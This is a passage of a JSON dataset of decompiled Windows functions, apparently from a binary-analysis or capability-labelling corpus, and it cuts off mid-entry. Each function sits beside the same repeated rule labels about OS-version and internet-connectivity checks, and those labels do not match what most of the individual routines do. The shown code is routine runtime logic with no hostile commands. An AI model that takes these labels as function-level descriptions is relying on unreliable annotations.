            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419ae8(char param_1, uint32_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) <= param_2) {\n        if (param_2 < 0) {\n            fcn.0040dab4();\n            fcn.00404eb4();\n            return;\n        }\n        fcn.00419a44();\n    }\n    if (param_1 != '\\0') {\n        puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n        *puVar1 = *puVar1 | '\\x01' << (param_2 & 7);\n        return;\n    }\n    puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n    *puVar1 = *puVar1 & ~('\\x01' << (param_2 & 7));\n    return;\n}\n",
        "token_count": 217
    },
    "00419ca8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00419d11)\n\nvoid fcn.00419ca8(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x419d3d;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00404520();\n    fcn.004056d0();\n    iVar1 = fcn.0040483c();\n    if (iVar1 != 0) {\n        fcn.0040483c();\n        fcn.0040483c();\n    }\n    *in_FS_OFFSET = in_stack_fffffed4;\n    fcn.0040546c(0x419d44);\n    return;\n}\n",
        "token_count": 221
    },
    "00419e34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419e34(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (0 < *(in_EAX[2] + 8)) {\n        puStack16 = 0x419e50;\n        (**(*in_EAX + 0x20))();\n        uStack20 = 0x419e8e;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        while (0 < *(in_EAX[2] + 8)) {\n            fcn.004196f8();\n            fcn.00404640();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x419e95;\n        uStack20 = 0x419e8d;\n        (**(*in_EAX + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "0041a084": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a084(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[4] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    in_EAX[4] = in_EAX[4] + 1;\n    return;\n}\n",
        "token_count": 73
    },
    "0041a140": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a140(void)\n\n{\n    int32_t *in_EAX;\n    \n    in_EAX[4] = in_EAX[4] + -1;\n    if (in_EAX[4] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "0041aa28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041aa28(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        (**(**(in_EAX + 0x14) + 0x10))();\n    }\n    fcn.00406f54();\n    if (*(in_EAX + 0x14) != 0) {\n        (**(**(in_EAX + 0x14) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "0041b14c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b14c(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    if (*(in_EAX + 9) != '\\0') {\n        fcn.0041a238();\n    }\n    if ((in_EDX < 0) || (in_EAX[7] < in_EDX)) {\n        fcn.0041a238();\n    }\n    (**(*in_EAX + 0x88))(arg_8h);\n    return;\n}\n",
        "token_count": 119
    },
    "0041b524": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b524(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *extraout_ECX;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041b53c:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041b566;\n            }\n            else if (arg_ch < 1) goto code_r0x0041b566;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041b53c;\n    fcn.0040dab4();\n    fcn.00404eb4();\n    in_EAX = extraout_ECX;\ncode_r0x0041b566:\n    (**(*in_EAX + 4))();\n    return;\n}\n",
        "token_count": 214
    },
    "0041b5c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b5c4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t var_20h;\n    int32_t var_1ah;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t *var_4h;\n    \n    var_14h = &var_20h;\n    var_10h = *(*in_EAX + 0x18);\n    var_4h = in_EAX;\n    var_20h = fcn.00404518();\n    while ((var_20h != 0 && (var_20h != *0x417720))) {\n        var_20h = fcn.004045cc();\n    }\n    if (var_20h == 0) {\n        fcn.0041b578(&stack0xfffffffc);\n    }\n    unique0x00007a00 = *(var_20h + 0x18);\n    if (var_10h == unique0x00007a00) {\n        fcn.0041b578(&stack0xfffffffc);\n    }\n    (**(*var_4h + 0x18))(param_2, param_2 >> 0x1f);\n    return;\n}\n",
        "token_count": 288
    },
    "0041b648": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0041b648(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041b667:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041b691;\n            }\n            else if (arg_ch < 1) goto code_r0x0041b691;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041b667;\n    fcn.0040dab4();\n    fcn.00404eb4();\ncode_r0x0041b691:\n    iVar1 = (**(*in_EAX + 0x14))();\n    return iVar1;\n}\n",
        "token_count": 222
    },
    "0041b728": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b728(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_EDX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    int64_t iVar2;\n    uint uStackY52;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = CONCAT44(arg_ch, arg_8h);\n    if ((arg_ch == 0) && (iVar2 = CONCAT44(arg_ch, arg_8h),  arg_8h == 0)) {\n        uStackY52 = 0x41b74d;\n        fcn.0041b4ac(0, 0);\n        uStackY52 = 0x41b753;\n        iVar2 = (***in_EDX)();\n    }\n    arg_ch = iVar2 >> 0x20;\n    arg_8h = iVar2;\n    if (arg_ch == 0) {\n        if (arg_8h < 0xf001) {\ncode_r0x0041b781:\n            var_14h = arg_8h;\n            goto code_r0x0041b787;\n        }\n    }\n    else if (iVar2 < 0x100000000) goto code_r0x0041b781;\n    var_14h = 0xf000;\ncode_r0x0041b787:\n    fcn.00402ef0();\n    uStackY52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    do {\n        arg_ch = iVar2 >> 0x20;\n        arg_8h = iVar2;\n        if (iVar2 == 0) {\n            *in_FS_OFFSET = uStackY52;\n            fcn.00402f0c();\n            return;\n        }\n        uVar1 = var_14h;\n        if (var_14h >> 0x1f == arg_ch) {\n            if (arg_8h <= var_14h) {\ncode_r0x0041b7b9:\n                uVar1 = arg_8h;\n            }\n        }\n        else if (arg_ch <= var_14h >> 0x1f) goto code_r0x0041b7b9;\n        fcn.0041b6b8();\n        fcn.0041b6f0();\n        iVar2 = iVar2 - uVar1;\n    } while( true );\n}\n",
        "token_count": 553
    },
    "0041b984": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b984(uint noname_0, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa8;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (in_DL != '\\0') {\n        puStack72 = 0x41b9a7;\n        in_EAX = fcn.00404964();\n        in_DL = extraout_DL;\n    }\n    uStack76 = 0x41bacc;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1h._0_1_ = in_DL;\n    if (arg_ch == -1) {\n        in_stack_ffffffa8 = 0x80;\n        puStack72 = &fcn.0041b984::var_1h + 1;\n        uVar1 = fcn.004058fc(0xc0000000, 0, 0, 2, 0x80, 0);\n        sub.kernel32.dll_CreateFileA_1(uVar1);\n        fcn.0041b87c();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040a608();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError_1();\n            fcn.0040d1e4();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            fcn.0040daf0(1, &fcn.0041b984::var_14h);\n            fcn.00404eb4();\n        }\n    }\n    else {\n        puStack72 = &fcn.0041b984::var_1h + 1;\n        fcn.0040a068();\n        fcn.0041b87c();\n        if (*(in_EAX + 4) < 0) {\n            fcn.0040a608();\n            var_14h = 0;\n            var_10h._0_1_ = 0xb;\n            sub.kernel32.dll_GetLastError_1();\n            fcn.0040d1e4();\n            var_ch = 0;\n            var_8h._0_1_ = 0xb;\n            in_stack_ffffffa8 = 1;\n            fcn.0040daf0(1, &fcn.0041b984::var_14h);\n            fcn.00404eb4();\n        }\n    }\n    fcn.004054c0();\n    *in_FS_OFFSET = in_stack_ffffffa8;\n    uStack80 = 0x41bad3;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 724
    },
    "0041bf3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041bf3c(int32_t arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack28 = 0x41bfce;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (*(arg_8h + 8) == '\\0') {\n        fcn.00405664();\n    }\n    else {\n        puStack24 = &stack0xfffffffc;\n        fcn.00409c6c();\n    }\n    var_ch = var_4h;\n    var_8h._0_1_ = 0xb;\n    arg_ch = &var_ch;\n    arg_8h_00 = 0;\n    fcn.00407480();\n    fcn.0040da34(arg_8h_00, arg_ch);\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack32 = 0x41bfd5;\n    fcn.0040546c();\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 338
    },
    "0041c234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0041c234(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    char *pcVar2;\n    \n    for (pcVar2 = *(in_EAX + 0x14); (*pcVar2 != '\\0' && (*pcVar2 != '.')); pcVar2 = pcVar2 + 1) {\n    }\n    cVar1 = *pcVar2;\n    if (cVar1 != '\\0') {\n        fcn.0040555c();\n        fcn.004059a4();\n    }\n    return cVar1 != '\\0';\n}\n",
        "token_count": 132
    },
    "0041c310": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c310(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41c3b9;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (param_2 != NULL) {\n        while (*param_2 != '\\0') {\n            for (; (*param_2 != '\\0' && (1 < *param_2 - 0x2dU)); param_2 = param_2 + 1) {\n            }\n            fcn.0040555c();\n            iVar2 = fcn.0041fb90();\n            if ((iVar2 == 0) && (cVar1 = fcn.00409980(),  cVar1 != '\\0')) {\n                iVar2 = in_EAX;\n            }\n            if (iVar2 == 0) break;\n            if (*param_2 == '.') {\n                param_2 = param_2 + 1;\n            }\n            if (*param_2 == '-') {\n                param_2 = param_2 + 1;\n            }\n            in_EAX = iVar2;\n            if (*param_2 == '>') {\n                param_2 = param_2 + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41c3c0;\n    uStack36 = 0x41c3b8;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 406
    },
    "0041c45c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041c45c(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = 0x41c46f;\n    (**(**0x4aa9b0 + 0x14))();\n    uStack40 = 0x41c618;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x41c487;\n    puStack36 = &stack0xfffffffc;\n    iVar1 = fcn.00419980();\n    uStack52 = 0x41c5f9;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if (*(iVar1 + 8) < 1) {\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x41c600;\n        uStack52 = 0x41c5f8;\n        fcn.004199e4();\n        return;\n    }\n    puStack60 = 0x41c4ad;\n    puStack48 = &stack0xfffffffc;\n    fcn.00404610();\n    uStack64 = 0x41c5da;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41c4ca;\n    puStack60 = &stack0xfffffffc;\n    fcn.00404610();\n    uStack76 = 0x41c588;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    iVar5 = 0;\n    puStack72 = &stack0xfffffffc;\ncode_r0x0041c569:\n    while( true ) {\n        if (*(iVar1 + 8) <= iVar5) {\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x41c58f;\n            uStack76 = 0x41c587;\n            fcn.00404640();\n            return;\n        }\n        puVar2 = fcn.00419610();\n        iVar3 = fcn.0041915c();\n        if (iVar3 != 0) break;\n        iVar4 = fcn.004163e8();\n        if (iVar4 != 0) break;\n        fcn.0041c414(&stack0xfffffffc);\n        iVar5 = iVar5 + 1;\n    }\n    if (iVar3 != 0) {\n        if ((*(iVar3 + 0x1c) & 2) != 0) {\n            fcn.0041c414(&stack0xfffffffc);\n            iVar5 = iVar5 + 1;\n            goto code_r0x0041c569;\n        }\n        fcn.0041c310();\n        (***puVar2)();\n    }\n    fcn.0041c3dc(&stack0xfffffffc);\n    fcn.00419504();\n    fcn.00404640();\n    goto code_r0x0041c569;\n}\n",
        "token_count": 801
    },
    "0041c628": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c628(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x4aa9cc == 0) {\n        return;\n    }\n    puStack28 = 0x41c64e;\n    iVar2 = fcn.00419980();\n    uStack32 = 0x41c6c3;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(iVar2 + 8) + -1;\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            iVar3 = fcn.00419610();\n            if ((in_EAX == 0) || (*(iVar3 + 8) == in_EAX)) {\n                if (param_2 != 0) {\n                    cVar1 = fcn.00409980();\n                    if (cVar1 == '\\0') goto code_r0x0041c6a5;\n                }\n                fcn.00419504();\n                fcn.00404640();\n            }\ncode_r0x0041c6a5:\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41c6ca;\n    uStack32 = 0x41c6c2;\n    fcn.004199e4();\n    return;\n}\n",
        "token_count": 393
    },
    "0041c6d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041c6d4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    if (*0x4aa9cc != 0) {\n        puStack24 = 0x41c6f1;\n        iVar1 = fcn.00419980();\n        uStack28 = 0x41c74b;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack24 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.00419610();\n                if (*(iVar2 + 4) == in_EAX) {\n                    fcn.00419504();\n                    fcn.00404640();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41c752;\n        uStack28 = 0x41c74a;\n        fcn.004199e4();\n        return;\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "0041c820": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c820(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00409980();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        (*arg_10h)();\n        fcn.0040546c();\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0041c85c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c85c(uint noname_0, uint noname_1, code *arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x41c878;\n    cVar1 = fcn.00409980();\n    if ((cVar1 != '\\0') && (arg_10h._2_2_ != 0)) {\n        puStack24 = 0x41c893;\n        cVar1 = fcn.0041e8c8();\n        if (cVar1 != '\\n') {\n            *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n            puStack24 = 0x41c8a5;\n            fcn.0041e9d8();\n            *(in_EAX + 0x88) = 1;\n            puStack24 = 0x41c8b4;\n            fcn.0041c770();\n        }\n        puStack24 = 0x41c8c0;\n        piVar2 = fcn.00404610();\n        uStack28 = 0x41c926;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.0041cd60();\n        (**(*piVar2 + 4))();\n        fcn.0041cd60();\n        *(in_EAX + 0x88) = 1;\n        (*arg_10h)();\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x41c92d;\n        uStack28 = 0x41c925;\n        fcn.00404640();\n        return;\n    }\n    return;\n}\n",
        "token_count": 461
    },
    "0041c97c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c97c(int32_t *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_EDX;\n    uint var_10ch;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = in_EDX;\n    if (*(in_EAX + 0x42) == 0) {\n        var_9h = '\\x01';\n    }\n    else {\n        fcn.00405708();\n        iVar1 = fcn.004048c4();\n        *arg_8h = iVar1;\n        arg_8h[1] = var_4h;\n        var_9h = *arg_8h == 0;\n        (*in_EAX[0x10])(&var_9h, arg_8h);\n    }\n    if (var_9h != '\\0') {\n        arg_8h[1] = var_4h;\n        iVar1 = (**(*in_EAX + 0x1c))();\n        *arg_8h = iVar1;\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "0041ca6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041ca6c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x41ca7e;\n    iVar1 = fcn.00419980();\n    uStack24 = 0x41cadc;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00419610();\n            if ((*(iVar2 + 4) == *(in_EAX + 4)) && (*(iVar2 + 0xc) == *(in_EAX + 0xc))) {\n                fcn.00404640();\n                fcn.00419504();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41cae3;\n    uStack24 = 0x41cadb;\n    fcn.004199e4();\n    return;\n}\n",
        "token_count": 296
    },
    "0041cae8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041cae8(void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x41cc1e;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar1 = in_EAX[0xc];\n    if (iVar1 != 0) {\n        uStack52 = 0x41cc01;\n        uStack56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        var_10h = *(iVar1 + 8);\n        puVar2 = &stack0xfffffffc;\n        var_8h = in_EAX;\n        if (-1 < var_10h + -1) {\n            do {\n                puStack36 = puVar2;\n                puVar4 = fcn.00419610();\n                fcn.00405504();\n                (**(*var_8h + 0x24))();\n                var_ch = fcn.0041c310();\n                if ((var_ch == 0) && (*(var_8h + 0x7a) != 0)) {\n                    (*var_8h[0x1e])(&fcn.0041cae8::var_ch);\n                }\n                fcn.00419610();\n                fcn.0041ca6c();\n                if ((var_ch == 0) && (cVar3 = fcn.0041c234(),  cVar3 != '\\0')) {\n                    fcn.00419610();\n                    fcn.004198f8();\n                    fcn.00419704();\n                }\n                else {\n                    (***puVar4)();\n                }\n                var_10h = var_10h + -1;\n                puVar2 = puStack36;\n            } while (var_10h != 0);\n        }\n        *in_FS_OFFSET = uStack56;\n        puStack48 = 0x41cc08;\n        uStack52 = 